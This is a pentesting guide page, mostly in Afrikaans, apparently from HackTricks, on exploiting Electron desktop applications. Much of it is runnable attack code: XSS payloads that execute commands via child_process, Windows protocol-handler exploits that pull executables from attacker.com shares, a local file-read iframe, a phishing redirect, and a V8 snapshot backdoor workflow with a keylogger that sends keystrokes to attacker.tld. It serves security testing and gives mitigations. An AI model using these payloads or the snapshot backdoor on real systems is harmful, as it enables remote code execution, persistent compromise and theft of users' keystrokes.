# Electron Desktop-toepassings

{{#include ../../../banners/hacktricks-training.md}}

## Inleiding

Electron kombineer 'n plaaslike backend (met **NodeJS**) en 'n frontend (**Chromium**), alhoewel dit sekere sekuriteitsmeganismes van moderne blaaiers ontbreek.

Gewoonlik sal jy die Electron-app-kode binne 'n `.asar` aansoek vind; om die kode te verkry moet jy dit uitpak:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
In die bronkode van 'n Electron app, binne `packet.json`, kan jy die aangeduide `main.js`-lêer vind waar sekuriteitskonfigurasies gestel is.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron het 2 proses-tipes:

- Main Process (het volledige toegang tot NodeJS)
- Renderer Process (moet vir sekuriteitsredes beperkte toegang tot NodeJS hê)

![](<../../../images/image (182).png>)

'n **renderer process** sal 'n blaaiervenster wees wat 'n lêer laai:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Instellings van die **renderer-proses** kan in die **main-proses** binne die main.js-lêer **gekonfigureer** word. Sommige van die konfigurasies sal **voorkom dat die Electron-toepassing RCE kry** of ander kwesbaarhede as die **instellings korrek gekonfigureer** is.

Die Electron-toepassing **kan toegang tot die toestel kry** via Node apis alhoewel dit gekonfigureer kan word om dit te voorkom:

- **`nodeIntegration`** - is `off` per verstek. As dit aan is, laat dit toe om Node-funksies vanaf die renderer-proses te gebruik.
- **`contextIsolation`** - is `on` per verstek. As dit `off` is, is die main- en renderer-prosesse nie geïsoleer nie.
- **`preload`** - leeg per verstek.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - is `off` per verstek. Dit sal die aksies beperk wat NodeJS kan uitvoer.
- Node-integrasie in Workers
- **`nodeIntegrationInSubframes`** - is `off` per verstek.
- As **`nodeIntegration`** **geaktiveer** is, sal dit die gebruik van **Node.js APIs** toelaat in webblaaie wat **gelaai is in iframes** binne 'n Electron-toepassing.
- As **`nodeIntegration`** **gedeaktiveer** is, sal preloads dan in die iframe gelaai word

Voorbeeld van konfigurasie:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Sommige **RCE payloads** van [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Vang netwerkverkeer

Wysig die start-main-konfigurasie en voeg die gebruik van 'n proxy soos:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

As jy 'n Electron App lokaal kan uitvoer, is dit moontlik dat jy dit kan dwing om willekeurige javascript-kode uit te voer. Kyk hoe in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

As die **nodeIntegration** op **on** gestel is, kan 'n webblad se JavaScript maklik Node.js-funksies gebruik net deur die `require()` aan te roep. Byvoorbeeld, die manier om die calc-toepassing op Windows uit te voer is:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Die script wat in hierdie instelling aangedui word is l**oaded before other scripts in the renderer**, dus het dit **onbeperkte toegang tot Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Daarom kan die script node-features na bladsye uitvoer:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **As `contextIsolation` aan is, sal dit nie werk nie**

## RCE: XSS + contextIsolation

Die _**contextIsolation**_ skep **afgeskeide kontekste tussen die webblad se skripte en die Electron se interne JavaScript-kode** sodat die JavaScript-uitvoering van elke kode mekaar nie beïnvloed nie. Dit is 'n nodige funksie om die moontlikheid van RCE uit te skakel.

As die kontekste nie geïsoleer is nie, kan 'n aanvaller:

1. Voer **arbitrary JavaScript in renderer** uit (XSS of navigasie na eksterne webwerwe)
2. **Overwrite the built-in method** wat in preload of Electron se interne kode gebruik word om beheer oor die funksie te kry
3. **Trigger** die gebruik van die **overwritten function**
4. RCE?

Daar is 2 plekke waar ingeboude metodes oorskryf kan word: In preload-kode of in Electron se interne kode:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Omseil klikgebeurtenis

As daar beperkings toegepas word wanneer jy op 'n skakel klik, kan jy dit dalk omseil deur 'n **middel-klik** te gebruik in plaas van 'n gewone linkermuisklik
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Vir meer inligting oor hierdie voorbeelde, kyk na [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) en [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Wanneer 'n Electron desktop-toepassing uitgerol word, is dit noodsaaklik om die korrekte instellings vir `nodeIntegration` en `contextIsolation` te verseker. Daar is vasgestel dat **client-side remote code execution (RCE)** wat preload scripts of Electron se native code vanaf die main process teiken, met hierdie instellings in plek effektief verhoed word.

Wanneer 'n gebruiker met skakels interaksie het of nuwe vensters oopmaak, word spesifieke event listeners geaktiveer, wat kritiek is vir die toepassing se sekuriteit en funksionaliteit:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Hierdie listeners word **oorskryf deur die desktop-toepassing** om sy eie **bedryfslogika** te implementeer. Die toepassing evalueer of 'n genavigeerde skakel intern of in 'n eksterne webblaaier geopen moet word. Hierdie besluit word gewoonlik geneem deur 'n funksie, `openInternally`. As hierdie funksie `false` teruggee, dui dit aan dat die skakel ekstern geopen moet word deur gebruik te maak van die `shell.openExternal` funksie.

**Here is a simplified pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS security best practices raai af om onbetroubare inhoud met die `openExternal` funksie te aanvaar, aangesien dit tot RCE via verskeie protokolle kan lei. Bedryfstelsels ondersteun verskillende protokolle wat RCE kan veroorsaak. Vir gedetaileerde voorbeelde en verdere verduideliking oor hierdie onderwerp kan verwys word na [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), wat Windows-protokolvoorbeelde bevat wat hierdie kwesbaarheid kan uitbuit.

In macos kan die `openExternal` funksie misbruik word om ewekansige opdragte uit te voer, soos in `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Examples of Windows protocol exploits include:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Hierdie vuln kan gevind word in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Die **webviewTag** is 'n **verouderde funksie** wat die gebruik van **NodeJS** in die **renderer-proses** moontlik maak, en dit behoort gedeaktiveer te word aangesien dit toelaat om 'n skrip binne die preload-konteks te laai, soos:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Daarom kan 'n aanvaller wat daarin slaag om 'n arbitrêre bladsy te laai, daardie tag gebruik om **'n arbitrêre preload script te laai**.

Hierdie preload script is toe misbruik om 'n **kwesbare IPC-diens (`skype-new-window`)** aan te roep, wat **`shell.openExternal`** aangeroep het om RCE te kry:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lees Interne Lêers: XSS + contextIsolation

**Deaktivering van `contextIsolation` maak die gebruik van `<webview>`-tags moontlik**, soortgelyk aan `<iframe>`, om plaaslike lêers te lees en te exfiltrating. 'n Voorbeeld toon hoe hierdie kwesbaarheid misbruik kan word om die inhoud van interne lêers te lees:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Verder word nog 'n metode vir **lees van 'n interne lêer** gedeel, wat 'n kritieke lokale lêerlees-kwesbaarheid in 'n Electron desktop app uitlig. Dit behels die injeksie van 'n script om die toepassing te misbruik en data te exfiltrate:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Old Chromium**

As die **chromium** wat deur die toepassing gebruik word **oud** en daar **bekende** **vulnerabilities** daarop is, kan dit moontlik wees om dit te **exploit** en RCE deur 'n XSS te verkry.\
Jy kan 'n voorbeeld in hierdie **writeup** sien: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Indien jy 'n XSS gevind het maar jy **cannot trigger RCE or steal internal files**, kan jy probeer om dit te gebruik om **steal credentials via phishing**.

Eerstens moet jy weet wat gebeur wanneer jy probeer om 'n nuwe URL te open deur die JS-kode in die front-end na te gaan:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Die oproep na **`openInternally`** sal besluit of die **link** in die **desktop window** geopen sal word aangesien dit ’n link is wat aan die platform behoort, **of** dit in die **browser as a 3rd party resource** geopen sal word.

In die geval dat die **regex** wat deur die funksie gebruik word **vatbaar is vir omseilings** (byvoorbeeld deur **nie die kolletjies van subdomeine te ontsnap nie), kan ’n aanvaller die XSS misbruik om ’n **nuwe venster te open wat** in die aanvaller se infrastruktuur geleë sal wees en die gebruiker **asking for credentials**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokol

Soos in [die docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) genoem, het bladsye wat op **`file://`** hardloop eenzijdige toegang tot elke lêer op jou masjien, wat beteken dat **XSS issues can be used to load arbitrary files** vanaf die gebruiker se masjien. Die gebruik van 'n **aangepaste protokol** voorkom sulke probleme aangesien jy die protokol kan beperk tot slegs 'n spesifieke stel lêers.

## Remote module

Die Electron Remote module laat **renderer processes to access main process APIs**, wat kommunikasie binne 'n Electron-toepassing vergemaklik. Tog bring die inskakeling van hierdie module beduidende sekuriteitsrisiko's mee. Dit vergroot die toepassing se aanval-oppervlakte en maak dit meer kwesbaar vir swakpunte soos cross-site scripting (XSS) aanvalle.

> [!TIP]
> Alhoewel die **remote** module sommige APIs van main na renderer processes openbaar, is dit nie maklik om slegs deur misbruik van die komponente RCE te kry nie. Die komponente kan egter sensitiewe inligting openbaar.

> [!WARNING]
> Baie apps wat steeds die remote module gebruik doen dit op 'n wyse wat **require NodeIntegration to be enabled** in the renderer process, wat 'n **enorme sekuriteitsrisiko** is.

Sedert Electron 14 kan die `remote` module op verskeie maniere geaktiveer wees; vanweë sekuriteits- en prestasie-redes word dit **aanbeveel om dit nie te gebruik nie**.

Om dit te aktiveer, moet dit eers in die **main process** geaktiveer word:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Dan kan die renderer-proses voorwerpe uit die module soos volg invoer:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Die **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** dui 'n paar interessante **funksies** aan wat deur die object **`app`** van die remote module blootgestel word:

- **`app.relaunch([options])`**
- **Herbegin** die toepassing deur die huidige instansie te **verlaat** en 'n nuwe een te **lans**. Nuttig vir **app updates** of beduidende **state changes**.
- **`app.setAppLogsPath([path])`**
- **Bepaal** of **skep** 'n gids vir die stoor van **app logs**. Die logs kan gebruik word om met **`app.getPath()`** of **`app.setPath(pathName, newPath)`** **gekry** of **gewysig** te word.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registreer** die huidige uitvoerbare as die **standaardbehandelaar** vir 'n gespesifiseerde **protocol**. Jy kan 'n **custom path** en **arguments** verskaf indien nodig.
- **`app.setUserTasks(tasks)`**
- **Voeg** tasks by die **Tasks category** in die **Jump List** (op Windows). Elke taak kan beheer hoe die app **gelans** word of watter **arguments** deurgegee word.
- **`app.importCertificate(options, callback)`**
- **Importeer** 'n **PKCS#12 certificate** in die stelsel se **certificate store** (slegs Linux). 'n **callback** kan gebruik word om die resultaat te hanteer.
- **`app.moveToApplicationsFolder([options])`**
- **Skuif** die toepassing na die **Applications folder** (op macOS). Help om 'n **standard installation** vir Mac-gebruikers te verseker.
- **`app.setJumpList(categories)`**
- **Stel** of **verwyder** 'n **custom Jump List** op **Windows**. Jy kan **categories** spesifiseer om te organiseer hoe take aan die gebruiker verskyn.
- **`app.setLoginItemSettings(settings)`**
- **Konfigureer** watter **executables** by **login** begin tesame met hul **options** (slegs macOS en Windows).

Voorbeeld:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

Die **primêre API** om toegang te kry tot stelselvoorkeure en om **stelselgebeure** in Electron uit te stuur. Metodes soos **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, en **setUserDefault** is almal **deel van** hierdie module.

**Voorbeeldgebruik:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Luister** na **inheemse macOS-kennisgewings** met NSDistributedNotificationCenter.
* Voor **macOS Catalina** kon jy **alle** verspreide kennisgewings afluister deur **nil** aan CFNotificationCenterAddObserver te gee.
* Na **Catalina / Big Sur** kan sandboxed apps steeds **subscribe** op **many events** (for example, **screen locks/unlocks**, **volume mounts**, **network activity**, etc.) deur kennisgewings **by name** te registreer.

### **getUserDefault / setUserDefault**

* **Koppel** met **NSUserDefaults**, wat toepassings- of globale voorkeure op macOS stoor.

* **getUserDefault** kan **sensitiewe inligting** **verkry**, soos **onlangse lêerliggings** of **die gebruiker se geografiese ligging**.

* **setUserDefault** kan hierdie voorkeure **wysig**, wat moontlik ’n app se **konfigurasie** beïnvloed.

* In **ouer Electron versions** (before v8.3.0) was slegs die **standard suite** van NSUserDefaults **accessible**.

## Shell.showItemInFolder

Hierdie funksie wys die gegewe lêer in ’n file manager, wat die lêer **outomaties kan uitvoer**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron apps should have a **Content Security Policy (CSP)** to **prevent XSS attacks**. The **CSP** is a **security standard** that helps **prevent** the **execution** of **untrusted code** in the browser.

It's usually **configured** in the **`main.js`** file or in the **`index.html`** template with the CSP inside a **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Gereedskap**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) is a tool to identify misconfigurations and security anti-patterns in Electron-based applications.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) is an open source VS Code plugin for Electron applications that uses Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) om kwesbare derdeparty-biblioteke te kontroleer
- [**Electro.ng**](https://electro.ng/): Jy moet dit koop

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) kan jy ’n lab vind om kwesbare Electron-apps te exploit.

Sommige commando's wat jou met die lab sal help:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Plaaslike backdooring deur V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron- en Chromium-gebaseerde apps deserialiseer 'n voorafgeboude V8 heap snapshot tydens opstart (v8_context_snapshot.bin, en opsioneel browser_v8_context_snapshot.bin) om elke V8 isolate te inisialisseer (main, preload, renderer). Histories het Electron se integrity fuses hierdie snapshots nie as uitvoerbare inhoud beskou nie, sodat hulle beide fuse-gebaseerde integriteitsdwinging en OS code-signing kontroles omseil het. Gevolglik het die vervanging van die snapshot in 'n gebruikers-skryfbare installasie gesluierde, volhoubare koduitvoering binne die app moontlik gemaak sonder om die getekende binaries of ASAR te wysig.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation en OnlyLoadAppFromAsar valideer app JavaScript binne die ASAR, maar hulle het nie V8 heap snapshots gedek nie (CVE-2025-55305). Chromium voer soortgelyk nie integriteitskontroles op snapshots uit nie.
- Attack preconditions: Plaaslike skryftoegang tot die app se installasiegids. Dit is algemeen op stelsels waar Electron apps of Chromium browsers geïnstalleer is onder gebruikers-skryfbare paaie (e.g., %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: Betroubare uitvoering van die aanvaller se JavaScript in enige isolate deur 'n gereeld gebruikte builtin (a “gadget”) te oorskryf, wat volhoubaarheid en omseiling van code-signing verifikasie moontlik maak.
- Affected surface: Electron apps (even with fuses enabled) and Chromium-based browsers that load snapshots from user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (voer verskillende kode uit in main vs. renderer)
- Main-proses deteksie: Node-slegs globals soos process.pid, process.binding(), of process.dlopen is teenwoordig in die main-proses-isolate.
- Browser/renderer deteksie: Blaaier-slegs globals soos alert is beskikbaar wanneer dit in 'n dokumentkonteks uitgevoer word.

Voorbeeld-gadget wat eenmalig die main-proses se Node-vermoëns ondersoek.
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-konteks data-diefstal PoC (bv. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operateur-werkvloei
1) Skryf payload.js wat 'n algemene builtin oor-skryf (bv. Array.isArray) en opsioneel per isolate vertakkings gebruik.
2) Bou die snapshot sonder Chromium-bronne:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Oorskryf die teiken-toepassing se snapshot-lêer(s):
- v8_context_snapshot.bin (altyd gebruik)
- browser_v8_context_snapshot.bin (as die LoadBrowserProcessSpecificV8Snapshot fuse gebruik word)
4) Begin die toepassing; die gadget word uitgevoer wanneer die gekose builtin gebruik word.

Aantekeninge en oorwegings
- Integriteit/handtekening-omseiling: Snapshot-lêers word nie deur code-signing kontroles as native uitvoerbare lêers behandel nie en (histories) was hulle nie deur Electron’s fuses of Chromium integriteitskontroles gedek nie.
- Persistensie: Om die snapshot in 'n gebruikerskryfbare installasie te vervang oorleef gewoonlik herlaai van die app en lyk soos 'n ondertekende, legitieme app.
- Chromium-blaaiers: Dieselfde manipulasie-konsep geld vir Chrome/afgeleides wat in gebruikerskryfbare ligginge geïnstalleer is. Chrome het ander integriteitsmitigasies maar sluit eksplisiet fisies plaaslike aanvalle uit van sy bedreigingsmodel.

Opsporing en mitigasies
- Behandel snapshots as uitvoerbare inhoud en sluit dit in by integriteitshandhawing (CVE-2025-55305 fix).
- Gebruik voorkeurlik slegs admin-skryfbare installasieligginge; stel 'n basislyn op en monitor hashes vir v8_context_snapshot.bin en browser_v8_context_snapshot.bin.
- Detecteer vroeë-runtime builtin-oor-skrywing (clobbering) en onverwagte snapshot-wijzigings; waarsku wanneer gedeserialiseerde snapshots nie by verwagte waardes pas nie.

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
